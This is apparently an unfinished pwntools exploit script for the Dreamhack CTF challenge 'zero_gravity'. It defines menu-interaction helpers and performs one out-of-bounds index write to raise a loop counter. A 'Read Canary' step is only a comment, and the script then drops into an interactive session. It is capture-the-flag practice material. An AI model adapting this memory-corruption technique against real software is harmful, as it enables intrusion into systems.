from pwn import *
def slog(name, addr):
	return success(": ".join([name, hex(addr)]))

context.log_level = "debug"

LOCAL = True
if LOCAL == True:
	p = process("./zero_gravity")
else:
	PORT = int(input("Input Port: "))
	HOST = int(input("Input Host: "))
	p = remote("host"+str(HOST)+".dreamhack.games", PORT)

def read_value(idx):
	p.sendlineafter(">> ", b"r")
	p.sendlineafter(">> ", bytes(str(idx), 'utf-8'))

def add_value(idx, value):
	p.sendlineafter(">> ", b"a")
	p.sendlineafter(">> ", bytes(str(idx), 'utf-8'))
	p.sendlineafter(">> ", bytes(str(value), 'utf-8'))

# [1] Increase cnt for loop
add_value(16, 2)

# [2] Read Canary

p.interactive()
